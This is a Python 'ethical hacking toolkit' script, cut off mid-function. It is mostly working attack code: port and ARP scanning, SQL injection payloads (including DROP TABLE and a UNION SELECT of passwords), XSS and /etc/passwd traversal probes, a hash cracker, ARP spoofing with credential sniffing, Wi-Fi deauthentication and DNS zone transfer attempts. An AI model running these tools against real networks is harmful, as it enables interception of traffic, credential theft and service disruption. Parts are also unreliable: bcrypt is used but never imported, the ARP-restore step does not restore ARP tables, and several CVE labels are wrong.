#!/usr/bin/env python3
"""
Advanced Ethical Hacking Toolkit
A comprehensive security testing framework with multiple tools in one package
"""

import os
import sys
import socket
import subprocess
import threading
import time
import json
import re
import random
import hashlib
import binascii
import platform
import requests
import dns.resolver
import dns.zone
import dns.query
import scapy.all as scapy
import paramiko
import psutil
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from scapy.layers import http

# ==============================================
# GLOBAL CONFIGURATION
# ==============================================
VERSION = "4.0"
AUTHOR = "Ethical Hacker"
MAX_THREADS = 50
TIMEOUT = 2.0
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
]

# ==============================================
# COLOR FORMATTING
# ==============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    print(f"""
{Colors.BLUE}███████╗ ██████╗  ██████╗ ███████╗███████╗████████╗██╗███╗   ██╗███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝
██████╔╝███████║██║  ███╗█████╗  ███████╗   ██║   ██║██╔██╗ ██║██║     
██╔══██╗██╔══██║██║   ██║██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██║     
██║  ██║██║  ██║╚██████╔╝███████╗███████║   ██║   ██║██║ ╚████║╚██████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝{Colors.ENDC}
{Colors.GREEN}Advanced Ethical Hacking Toolkit v{VERSION}{Colors.ENDC}
{Colors.YELLOW}By: {AUTHOR}{Colors.ENDC}
{Colors.BLUE}Use only with explicit permission!{Colors.ENDC}
""")

# ==============================================
# ERROR HANDLING
# ==============================================
class HackToolError(Exception):
    pass

def handle_error(error, context=""):
    print(f"{Colors.RED}[!] Error: {error}{Colors.ENDC}")
    if context:
        print(f"{Colors.YELLOW}[!] Context: {context}{Colors.ENDC}")

# ==============================================
# PORT SCANNER
# ==============================================
class PortScanner:
    def __init__(self, target, ports=None, threads=MAX_THREADS, timeout=TIMEOUT):
        self.target = target
        self.ports = ports or range(1, 1025)
        self.threads = min(threads, MAX_THREADS)
        self.timeout = timeout
        self.open_ports = []
        self.services = {}
    
    def scan_port(self, port):
        """Scan a single port with service detection"""
        result = {
            'port': port,
            'status': 'closed',
            'service': None,
            'version': None,
            'banner': None
        }
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((self.target, port))
                result['status'] = 'open'
                
                # Grab banner
                try:
                    s.send(b'HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n')
                    banner = s.recv(1024).decode().strip()
                    result['banner'] = banner
                    
                    # Parse service and version
                    if 'SSH' in banner:
                        result['service'] = 'ssh'
                        result['version'] = banner.split('SSH-')[-1].split('\r')[0]
                    elif 'Apache' in banner:
                        result['service'] = 'http'
                        result['version'] = banner.split('Apache/')[-1].split('\r')[0]
                    elif 'nginx' in banner:
                        result['service'] = 'http'
                        result['version'] = banner.split('nginx/')[-1].split('\r')[0]
                except:
                    pass
        except socket.timeout:
            result['status'] = 'filtered'
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def run_scan(self):
        """Run multi-threaded port scan"""
        print(f"{Colors.BLUE}[*] Starting port scan of {self.target}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Scanning {len(self.ports)} ports with {self.threads} threads{Colors.ENDC}")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_port, port): port for port in self.ports}
            
            for future in as_completed(futures):
                result = future.result()
                
                if result['status'] == 'open':
                    self.open_ports.append(result['port'])
                    self.services[result['port']] = {
                        'service': result['service'],
                        'version': result['version'],
                        'banner': result['banner']
                    }
                    
                    print(f"{Colors.GREEN}[+] Port {result['port']}/tcp open - {result['service'] or 'Unknown'}{Colors.ENDC}")
                    if result['version']:
                        print(f"{Colors.YELLOW}    Version: {result['version']}{Colors.ENDC}")
        
        end_time = time.time()
        scan_time = end_time - start_time
        
        print(f"\n{Colors.BLUE}[*] Scan completed in {scan_time:.2f} seconds{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Found {len(self.open_ports)} open ports{Colors.ENDC}")
        
        return {
            'target': self.target,
            'scan_time': scan_time,
            'open_ports': self.open_ports,
            'services': self.services
        }

# ==============================================
# NETWORK DISCOVERY
# ==============================================
class NetworkDiscovery:
    def __init__(self, subnet, interface='eth0'):
        self.subnet = subnet
        self.interface = interface
        self.active_hosts = []
        self.mac_addresses = {}
    
    def arp_scan(self):
        """Perform ARP scan to discover hosts"""
        print(f"{Colors.BLUE}[*] Starting ARP scan on {self.subnet}{Colors.ENDC}")
        
        try:
            # Set interface to promiscuous mode
            subprocess.run(['sudo', 'ifconfig', self.interface, 'promisc'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Create ARP request packet
            arp_request = scapy.ARP(pdst=self.subnet)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send packet and capture responses
            answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=0)[0]
            
            # Process responses
            for sent, received in answered:
                self.active_hosts.append(received.psrc)
                self.mac_addresses[received.psrc] = received.hwsrc
            
            print(f"{Colors.GREEN}[*] Found {len(self.active_hosts)} active hosts{Colors.ENDC}")
            
            # Restore interface
            subprocess.run(['sudo', 'ifconfig', self.interface, '-promisc'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return {
                'subnet': self.subnet,
                'active_hosts': self.active_hosts,
                'mac_addresses': self.mac_addresses
            }
        except Exception as e:
            handle_error(f"ARP scan failed: {e}")
            return None

# ==============================================
# VULNERABILITY SCANNER
# ==============================================
class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        self.cve_db = self._load_cve_db()
    
    def _load_cve_db(self):
        """Load CVE database (simplified)"""
        return {
            'CVE-2021-44228': {'name': 'Log4Shell', 'severity': 'Critical'},
            'CVE-2021-3449': {'name': 'HTTP Request Smuggling', 'severity': 'High'},
            'CVE-2021-34527': {'name': 'PrintNightmare', 'severity': 'Critical'},
            'CVE-2021-22985': {'name': 'VMware vCenter Server', 'severity': 'High'},
            'CVE-2021-21972': {'name': 'MongoDB', 'severity': 'High'}
        }
    
    def check_common_vulnerabilities(self):
        """Check for common web vulnerabilities"""
        print(f"{Colors.BLUE}[*] Checking for common vulnerabilities on {self.target}{Colors.ENDC}")
        
        checks = [
            ('/', 'SQL Injection', self._test_sql_injection),
            ('/', 'XSS', self._test_xss),
            ('/', 'Directory Traversal', self._test_dir_traversal),
            ('/robots.txt', 'Sensitive Files', self._test_robots),
            ('/admin', 'Admin Panel', self._test_admin_panel),
        ]
        
        for path, vuln_name, test_func in checks:
            try:
                result = test_func(path)
                if result:
                    self.vulnerabilities.append({
                        'name': vuln_name,
                        'path': path,
                        'evidence': result
                    })
                    print(f"{Colors.RED}[!] {vuln_name} vulnerability found at {path}{Colors.ENDC}")
            except Exception as e:
                handle_error(f"Error testing {vuln_name}: {e}")
        
        return self.vulnerabilities
    
    def _test_sql_injection(self, path):
        """Test for SQL injection"""
        test_payloads = ["'", "\"", "';", "\";", "' OR 1=1 --", "\" OR 1=1 --"]
        
        for payload in test_payloads:
            test_url = f"{self.target}{path}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    # Check for SQL error messages
                    error_indicators = [
                        "You have an error in your SQL syntax",
                        "SQL syntax error",
                        "Warning: mysql_fetch_assoc()",
                        "Unclosed quotation mark"
                    ]
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            return f"SQL error: {indicator}"
            except:
                continue
        return None
    
    def _test_xss(self, path):
        """Test for XSS vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            test_url = f"{self.target}{path}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200 and payload in response.text:
                    return f"Payload reflected: {payload}"
            except:
                continue
        return None
    
    def _test_dir_traversal(self, path):
        """Test for directory traversal"""
        traversal_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "/etc/passwd"
        ]
        
        for payload in traversal_payloads:
            test_url = f"{self.target}{path}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200 and "root:" in response.text:
                    return f"Contents of /etc/passwd detected"
            except:
                continue
        return None
    
    def _test_robots(self, path):
        """Check robots.txt for sensitive files"""
        test_url = f"{self.target}/robots.txt"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                sensitive_paths = []
                for line in response.text.split('\n'):
                    if line.startswith('Disallow:'):
                        sensitive_paths.append(line.split(': ')[1].strip())
                if sensitive_paths:
                    return f"Sensitive paths found: {', '.join(sensitive_paths)}"
        except:
            pass
        return None
    
    def _test_admin_panel(self, path):
        """Check for admin panel"""
        admin_paths = ['/admin', '/administrator', '/admin/login', '/admin.php']
        for admin_path in admin_paths:
            test_url = f"{self.target}{admin_path}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    return f"Admin panel found at {admin_path}"
            except:
                continue
        return None
    
    def run_scan(self):
        """Run vulnerability scan"""
        self.check_common_vulnerabilities()
        
        # Check for CVEs in open ports
        scanner = PortScanner(self.target)
        port_scan = scanner.run_scan()
        
        for port, service in port_scan['services'].items():
            if service['service'] in ['http', 'https']:
                self.check_common_vulnerabilities()
        
        return {
            'target': self.target,
            'vulnerabilities': self.vulnerabilities,
            'scan_time': time.time()
        }

# ==============================================
# PASSWORD CRACKER
# ==============================================
class PasswordCracker:
    def __init__(self, hash_value, wordlist_path, hash_type='md5'):
        self.hash_value = hash_value.lower()
        self.wordlist_path = wordlist_path
        self.hash_type = hash_type
        self.found = None
    
    def _hash_md5(self, word):
        return hashlib.md5(word.encode()).hexdigest()
    
    def _hash_sha1(self, word):
        return hashlib.sha1(word.encode()).hexdigest()
    
    def _hash_sha256(self, word):
        return hashlib.sha256(word.encode()).hexdigest()
    
    def _hash_sha512(self, word):
        return hashlib.sha512(word.encode()).hexdigest()
    
    def _hash_ntlm(self, word):
        return hashlib.new('md4', word.encode('utf-16le')).hexdigest()
    
    def _hash_bcrypt(self, word, salt=None):
        if salt:
            return bcrypt.hashpw(word.encode(), salt.encode()).decode()
        return None
    
    def crack(self):
        """Attempt to crack password hash"""
        hash_functions = {
            'md5': self._hash_md5,
            'sha1': self._hash_sha1,
            'sha256': self._hash_sha256,
            'sha512': self._hash_sha512,
            'ntlm': self._hash_ntlm,
            'bcrypt': self._hash_bcrypt
        }
        
        if self.hash_type not in hash_functions:
            return {'error': f"Unsupported hash type: {self.hash_type}"}
        
        hash_func = hash_functions[self.hash_type]
        
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
                for i, word in enumerate(wordlist):
                    word = word.strip()
                    
                    # Calculate hash
                    if self.hash_type == 'bcrypt':
                        # Bcrypt requires salt extraction from the full hash
                        if '$' in self.hash_value:
                            salt = self.hash_value.split('$')[3]
                            hashed_word = self._hash_bcrypt(word, salt)
                        else:
                            continue
                    else:
                        hashed_word = hash_func(word)
                    
                    # Check if hash matches
                    if hashed_word == self.hash_value:
                        self.found = word
                        print(f"{Colors.GREEN}[+] Password found: {word}{Colors.ENDC}")
                        return {'password': word, 'attempts': i + 1}
                    
                    # Progress indicator
                    if (i + 1) % 1000 == 0:
                        print(f"{Colors.YELLOW}[*] Attempted {i + 1} passwords...{Colors.ENDC}")
                    
        except FileNotFoundError:
            return {'error': f"Wordlist not found: {self.wordlist_path}"}
        except Exception as e:
            return {'error': f"Error reading wordlist: {e}"}
        
        return {'password': None, 'attempts': i + 1}

# ==============================================
# ARP SPOOFER
# ==============================================
class ARPSpoofer:
    def __init__(self, interface):
        self.interface = interface
        self.gateway_ip = None
        self.target_ip = None
        self.running = False
    
    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=0)[0]
            return answered[1].hwsrc
        except:
            return None
    
    def get_gateway(self):
        """Get default gateway IP"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    self.gateway_ip = line.split('default via ')[1].split(' ')[0]
                    return self.gateway_ip
        except:
            return None
    
    def start_spoofing(self, target_ip):
        """Start ARP spoofing attack"""
        self.target_ip = target_ip
        self.gateway_ip = self.get_gateway()
        
        if not self.gateway_ip:
            print(f"{Colors.RED}[!] Could not determine gateway IP{Colors.ENDC}")
            return False
        
        try:
            # Enable IP forwarding
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Colors.YELLOW}[*] Starting ARP spoofing...{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Target: {self.target_ip}{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Gateway: {self.gateway_ip}{Colors.ENDC}")
            
            self.running = True
            self.spoof_thread = threading.Thread(target=self._spoof)
            self.spoof_thread.daemon = True
            self.spoof_thread.start()
            
            return True
        except Exception as e:
            handle_error(f"ARP spoofing failed: {e}")
            return False
    
    def _spoof(self):
        """ARP spoofing thread"""
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        
        if not target_mac or not gateway_mac:
            print(f"{Colors.RED}[!] Could not get MAC addresses{Colors.ENDC}")
            self.running = False
            return
        
        try:
            while self.running:
                # Spoof target
                packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip)
                scapy.send(packet, verbose=0)
                
                # Spoof gateway
                packet = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip)
                scapy.send(packet, verbose=0)
                
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop_spoofing()
    
    def stop_spoofing(self):
        """Stop ARP spoofing attack"""
        self.running = False
        if hasattr(self, 'spoof_thread'):
            self.spoof_thread.join()
        
        try:
            # Restore ARP tables
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}[*] ARP spoofing stopped{Colors.ENDC}")
        except:
            pass
    
    def packet_sniffer(self):
        """Sniff packets in MITM position"""
        if not self.running:
            print(f"{Colors.RED}[!] Start ARP spoofing first{Colors.ENDC}")
            return
        
        print(f"{Colors.YELLOW}[*] Starting packet sniffer...{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop{Colors.ENDC}")
        
        try:
            def process_packet(packet):
                if packet.haslayer(scapy.IP):
                    src_ip = packet[scapy.IP].src
                    dst_ip = packet[scapy.IP].dst
                    
                    if src_ip == self.target_ip or src_ip == self.gateway_ip:
                        print(f"{Colors.BLUE}[+] Packet: {src_ip} -> {dst_ip}{Colors.ENDC}")
                        
                        if packet.haslayer(scapy.Raw):
                            payload = packet[scapy.Raw].load
                            if b'POST' in payload or b'login' in payload.lower():
                                print(f"{Colors.RED}[!] Potential credentials: {payload[:100]}{Colors.ENDC}")
            
            scapy.sniff(prn=process_packet, store=0)
        except KeyboardInterrupt:
            print(f"{Colors.GREEN}[*] Packet sniffer stopped{Colors.ENDC}")

# ==============================================
# PACKET SNIFFER
# ==============================================
class PacketSniffer:
    def __init__(self, interface='eth0', filter_expression='ip'):
        self.interface = interface
        self.filter = filter_expression
        self.sniffing = False
    
    def start_sniffing(self, count=100):
        """Start packet sniffing"""
        print(f"{Colors.BLUE}[*] Starting packet sniffer on {self.interface}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Filter: {self.filter}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Press Ctrl+C to stop{Colors.ENDC}")
        
        try:
            def packet_handler(packet):
                if self.sniffing:
                    print(f"\n{Colors.YELLOW}Packet Analysis:{Colors.ENDC}")
                    
                    if packet.haslayer(scapy.IP):
                        src_ip = packet[scapy.IP].src
                        dst_ip = packet[scapy.IP].dst
                        protocol = packet[scapy.IP].proto
                        
                        print(f"  {Colors.BLUE}Source IP: {src_ip}{Colors.ENDC}")
                        print(f"  {Colors.BLUE}Destination IP: {dst_ip}{Colors.ENDC}")
                        print(f"  {Colors.BLUE}Protocol: {protocol}{Colors.ENDC}")
                        
                        if packet.haslayer(scapy.TCP):
                            src_port = packet[scapy.TCP].sport
                            dst_port = packet[scapy.TCP].dport
                            flags = packet[scapy.TCP].flags
                            seq = packet[scapy.TCP].seq
                            ack = packet[scapy.TCP].ack
                            
                            print(f"  {Colors.GREEN}TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.ENDC}")
                            print(f"  {Colors.GREEN}Flags: {flags} | Seq: {seq} | Ack: {ack}{Colors.ENDC}")
                            
                            if packet.haslayer(http.HTTPRequest):
                                print(f"  {Colors.BLUE}HTTP Request: {packet[http.HTTPRequest].Host.decode()}{Colors.ENDC}")
                        
                        elif packet.haslayer(scapy.UDP):
                            src_port = packet[scapy.UDP].sport
                            dst_port = packet[scapy.UDP].dport
                            length = packet[scapy.UDP].len
                            
                            print(f"  {Colors.GREEN}UDP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.ENDC}")
                            print(f"  {Colors.GREEN}Length: {length}{Colors.ENDC}")
                        
                        elif packet.haslayer(scapy.ICMP):
                            print(f"  {Colors.GREEN}ICMP Packet{Colors.ENDC}")
                            if packet.haslayer(scapy.ICMPv6EchoRequest):
                                print(f"  {Colors.GREEN}ICMPv6 Echo Request{Colors.ENDC}")
            
            self.sniffing = True
            scapy.sniff(iface=self.interface, prn=packet_handler, filter=self.filter, count=count)
        except KeyboardInterrupt:
            self.stop_sniffing()
    
    def stop_sniffing(self):
        """Stop packet sniffing"""
        self.sniffing = False
        print(f"{Colors.GREEN}[*] Packet sniffer stopped{Colors.ENDC}")

# ==============================================
# WEB APPLICATION TESTING
# ==============================================
class WebAppTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing SQL injection on {self.target_url}{Colors.ENDC}")
        
        test_payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "'; DROP TABLE users; --",
            "1' UNION SELECT null, username, password FROM users --"
        ]
        
        vulnerable = False
        for payload in test_payloads:
            try:
                # Try different parameters
                test_urls = [
                    f"{self.target_url}?id={payload}",
                    f"{self.target_url}?search={payload}",
                    f"{self.target_url}?q={payload}"
                ]
                
                for test_url in test_urls:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for SQL errors
                    error_indicators = [
                        "SQL syntax error",
                        "mysql_fetch_assoc()",
                        "You have an error in your SQL syntax",
                        "Warning: mysql_fetch_array()",
                        "Unclosed quotation mark"
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            print(f"{Colors.RED}[!] SQL injection vulnerability found: {test_url}{Colors.ENDC}")
                            print(f"{Colors.YELLOW}    Payload: {payload}{Colors.ENDC}")
                            print(f"{Colors.YELLOW}    Evidence: {indicator}{Colors.ENDC}")
                            vulnerable = True
                            break
            except:
                continue
        
        return vulnerable
    
    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing XSS on {self.target_url}{Colors.ENDC}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        vulnerable = False
        for payload in xss_payloads:
            try:
                # Try different parameters
                test_urls = [
                    f"{self.target_url}?q={payload}",
                    f"{self.target_url}?search={payload}",
                    f"{self.target_url}?name={payload}"
                ]
                
                for test_url in test_urls:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        print(f"{Colors.RED}[!] XSS vulnerability found: {test_url}{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    Payload: {payload}{Colors.ENDC}")
                        vulnerable = True
                        break
            except:
                continue
        
        return vulnerable
    
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing CSRF on {self.target_url}{Colors.ENDC}")
        
        # Check for anti-CSRF tokens
        try:
            response = self.session.get(self.target_url, timeout=5)
            
            # Check for common anti-CSRF patterns
            csrf_indicators = [
                "csrf_token",
                "csrfmiddlewaretoken",
                "authenticity_token",
                "anti_csrf_token"
            ]
            
            has_csrf_protection = any(indicator in response.text.lower() for indicator in csrf_indicators)
            
            if not has_csrf_protection:
                print(f"{Colors.RED}[!] Potential CSRF vulnerability found{Colors.ENDC}")
                print(f"{Colors.YELLOW}    No anti-CSRF token detected{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.GREEN}[+] CSRF protection detected{Colors.ENDC}")
                return False
        except:
            return False
    
    def run_tests(self):
        """Run all web application tests"""
        print(f"{Colors.BLUE}[*] Starting web application security testing on {self.target_url}{Colors.ENDC}")
        
        vulnerabilities = []
        
        if self.test_sql_injection():
            vulnerabilities.append('SQL Injection')
        
        if self.test_xss():
            vulnerabilities.append('XSS')
        
        if self.test_csrf():
            vulnerabilities.append('CSRF')
        
        # Check HTTP security headers
        self.test_security_headers()
        
        print(f"\n{Colors.BLUE}[*] Web application testing completed{Colors.ENDC}")
        
        if vulnerabilities:
            print(f"{Colors.RED}[!] Found {len(vulnerabilities)} vulnerabilities:{Colors.ENDC}")
            for vuln in vulnerabilities:
                print(f"    - {vuln}")
        else:
            print(f"{Colors.GREEN}[+] No critical vulnerabilities found{Colors.ENDC}")
        
        return vulnerabilities
    
    def test_security_headers(self):
        """Test HTTP security headers"""
        print(f"{Colors.BLUE}[*] Testing HTTP security headers{Colors.ENDC}")
        
        try:
            response = self.session.get(self.target_url, timeout=5)
            headers = response.headers
            
            security_headers = {
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-Content-Type-Options': 'XSS Protection',
                'X-Frame-Options': 'Clickjacking Protection',
                'X-XSS-Protection': 'XSS Protection',
                'Referrer-Policy': 'Referrer Control',
                'Feature-Policy': 'Feature Control'
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in headers:
                    missing_headers.append((header, description))
            
            if missing_headers:
                print(f"{Colors.YELLOW}[!] Missing security headers:{Colors.ENDC}")
                for header, description in missing_headers:
                    print(f"    - {header}: {description}")
            else:
                print(f"{Colors.GREEN}[+] All security headers present{Colors.ENDC}")
        except:
            print(f"{Colors.RED}[!] Error testing security headers{Colors.ENDC}")

# ==============================================
# WIRELESS NETWORK ANALYSIS
# ==============================================
class WirelessAnalyzer:
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.access_points = []
        self.clients = []
    
    def set_monitor_mode(self):
        """Set wireless interface to monitor mode"""
        try:
            print(f"{Colors.BLUE}[*] Setting {self.interface} to monitor mode{Colors.ENDC}")
            
            # Bring interface down
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Set monitor mode
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Bring interface up
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Colors.GREEN}[+] Monitor mode enabled{Colors.ENDC}")
            return True
        except Exception as e:
            handle_error(f"Error setting monitor mode: {e}")
            return False
    
    def restore_managed_mode(self):
        """Restore managed mode"""
        try:
            print(f"{Colors.BLUE}[*] Restoring {self.interface} to managed mode{Colors.ENDC}")
            
            # Bring interface down
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Set managed mode
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'managed'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Bring interface up
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Colors.GREEN}[+] Managed mode restored{Colors.ENDC}")
            return True
        except Exception as e:
            handle_error(f"Error restoring managed mode: {e}")
            return False
    
    def scan_networks(self, duration=10):
        """Scan for wireless networks"""
        if not self.set_monitor_mode():
            return None
        
        try:
            print(f"{Colors.BLUE}[*] Scanning for networks for {duration} seconds{Colors.ENDC}")
            
            # Start airodump-ng scan
            cmd = ['sudo', 'airodump-ng', '--output-format', 'csv', '--write', 'scan', self.interface]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for scan duration
            time.sleep(duration)
            
            # Stop scan
            process.terminate()
            process.wait()
            
            # Parse results
            networks = self._parse_airodump_results('scan-01.csv')
            self.access_points = networks
            
            print(f"{Colors.GREEN}[+] Found {len(networks)} access points{Colors.ENDC}")
            
            # Restore managed mode
            self.restore_managed_mode()
            
            return networks
        except Exception as e:
            handle_error(f"Error scanning networks: {e}")
            self.restore_managed_mode()
            return None
    
    def _parse_airodump_results(self, filename):
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
            
            # Skip header and footer
            for line in lines[1:-1]:
                if ',' in line:
                    parts = re.split(r',\s*', line.strip())
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0],
                            'first_time': parts[1],
                            'last_time': parts[2],
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'authentication': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'lan_ip': parts[11],
                            'essid': parts[13] if len(parts) > 13 else ''
                        }
                        networks.append(network)
            
            # Clean up
            for file in ['scan-01.csv', 'scan-01.kismet.csv', 'scan-01.kismet.netcsv']:
                try:
                    os.remove(file)
                except:
                    pass
            
            return networks
        except Exception as e:
            handle_error(f"Error parsing scan results: {e}")
            return []
    
    def deauthenticate_client(self, bssid, station_mac):
        """Deauthenticate a client from access point"""
        try:
            print(f"{Colors.YELLOW}[*] Deauthenticating {station_mac} from {bssid}{Colors.ENDC}")
            
            # Create deauth packet
            packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=station_mac, addr2=bssid, addr3=bssid) / scapy.Dot11Deauth()
            
            # Send packet
            scapy.sendp(packet, iface=self.interface, count=10, inter=0.1, verbose=0)
            print(f"{Colors.GREEN}[+] Deauthentication sent{Colors.ENDC}")
            return True
        except Exception as e:
            handle_error(f"Error deauthenticating client: {e}")
            return False

# ==============================================
# DNS ENUMERATION
# ==============================================
class DnsEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.records = {}
    
    def enumerate_records(self):
        """Enumerate DNS records"""
        print(f"{Colors.BLUE}[*] Enumerating DNS records for {self.domain}{Colors.ENDC}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'SOA', 'TXT', 'CNAME', 'SRV', 'PTR']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type, raise_on_no_answer=False)
                self.records[record_type] = [str(rdata) for rdata in answers]
                print(f"{Colors.GREEN}[+] Found {len(answers)} {record_type} records{Colors.ENDC}")
            except Exception as e:
                continue
        
        return self.records
    
    def zone_transfer(self, nameserver=None):
        """Attempt DNS zone transfer"""
        print(f"{Colors.BLUE}[*] Attempting DNS zone transfer for {self.domain}{Colors.ENDC}")
        
        try:
            if not nameserver:
                # Get authoritative nameservers
                answers = dns.resolver.resolve(self.domain, 'NS')
                nameservers = [str(rdata) for rdata in answers]
                print(f"{Colors.YELLOW}[*] Found nameservers: {', '.join(nameservers)}{Colors.ENDC}")
            else:
                nameservers = [nameserver]
            
            for ns in nameservers:
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns, self.domain))
                    
                    records = []
                    for name, node in zone.nodes.items():
                        for rdataset in node.rdatasets:
                            for record in rdataset:
                                records.append(f"{name}.{self.domain} {rdataset.ttl} {rdataset.rdtype} {record}")
                    
                    print(f"{Colors.GREEN}[+] Zone transfer successful from {ns}{Colors.ENDC}")
                    return records
                except Exception as e:
                    continue
            
